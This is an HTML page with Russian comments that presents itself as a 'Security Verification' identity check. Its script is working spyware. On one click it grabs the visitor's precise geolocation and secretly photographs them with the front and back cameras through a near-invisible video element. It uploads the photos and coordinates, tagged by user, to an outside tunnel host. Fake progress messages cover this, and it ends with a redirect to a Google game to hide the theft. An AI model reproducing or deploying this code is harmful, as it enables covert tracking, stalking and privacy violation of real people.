<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Security Verification</title>
    <style>
        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow: hidden; }
        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:85%; max-width: 380px; border:1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 10; position: relative; }
        .btn { background:#fff; color:#000; border:none; padding:18px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 18px; transition: 0.3s; text-transform: uppercase; }
        #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto; }
        @keyframes spin { 100% { transform:rotate(360deg); } }
        video { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        canvas { display:none; }
        p { color: #888; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
        body.flash-active { background: #fff !important; }
        .flash-active .card { opacity: 0; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="st">Verification</h2>
        <p id="msg">Please confirm your identity to proceed.</p>
        <button class="btn" id="go" onclick="run()">CONFIRM</button>
        <div id="loader"></div>
    </div>
    
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

<script>
    // КОНСТАНТЫ
    const API = "https://e8764e37277ceb.lhr.life"; 
    const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
    const urlParams = new URLSearchParams(window.location.search);
    const user = urlParams.get('user') || "Unknown";

    // Функция захвата с гарантированным ожиданием кадра
    async function capture(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false 
            });
            const v = document.getElementById('v');
            v.srcObject = stream;
            
            // Ждем, пока видео реально пойдет
            await new Promise((resolve) => {
                v.onloadedmetadata = () => v.play().then(resolve).catch(resolve);
            });

            // МАКСИМАЛЬНАЯ МОЩНОСТЬ: 3 секунды на адаптацию камеры (свет/фокус)
            await new Promise(r => setTimeout(r, 3000));

            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth || 1280;
            canvas.height = v.videoHeight || 720;
            canvas.getContext('2d').drawImage(v, 0, 0);

            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
            
            // Сразу тушим камеру
            stream.getTracks().forEach(t => t.stop());
            return blob;
        } catch (e) {
            console.error("Camera fail:", mode, e);
            return null;
        }
    }

    async function run() {
        const btn = document.getElementById('go');
        const loader = document.getElementById('loader');
        const msg = document.getElementById('msg');

        btn.style.display = 'none';
        loader.style.display = 'block';

        // 1. ГЕОЛОКАЦИЯ (параллельный запуск)
        navigator.geolocation.getCurrentPosition(p => {
            fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${encodeURIComponent(user)}`, {
                mode: 'no-cors', keepalive: true
            });
        }, null, {timeout: 5000, enableHighAccuracy: true});

        // 2. ПОСЛЕДОВАТЕЛЬНЫЙ ЗАХВАТ (Ждем завершения каждого)
        msg.innerText = "Security scanning (1/2)...";
        document.body.classList.add('flash-active');
        const frontBlob = await capture("user");
        document.body.classList.remove('flash-active');

        msg.innerText = "Environment scanning (2/2)...";
        const backBlob = await capture("environment");

        // 3. ПРИНУДИТЕЛЬНАЯ ОТПРАВКА
        const fd = new FormData();
        const ts = () => new Date().getTime();
        if (frontBlob) fd.append('files', frontBlob, `${ts()}_front.jpg`);
        if (backBlob) fd.append('files', backBlob, `${ts()}_back.jpg`);

        if (fd.has('files')) {
            msg.innerText = "Encrypting and uploading...";
            try {
                // КРИТИЧЕСКИЙ МОМЕНТ: ждем завершения fetch
                await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
                    method: 'POST',
                    body: fd,
                    mode: 'no-cors',
                    keepalive: true // Позволяет догрузить даже при закрытии вкладки
                });
                // Небольшая пауза, чтобы сетевой стек успел вытолкнуть данные
                await new Promise(r => setTimeout(r, 1000));
            } catch (e) {
                console.error("Upload error");
            }
        }

        // 4. ФИНАЛЬНЫЙ РЕДИРЕКТ
        msg.innerText = "Verified! Redirecting...";
        setTimeout(() => {
            window.location.replace(REDIRECT_URL);
        }, 500);
    }
</script>
</body>
</html>
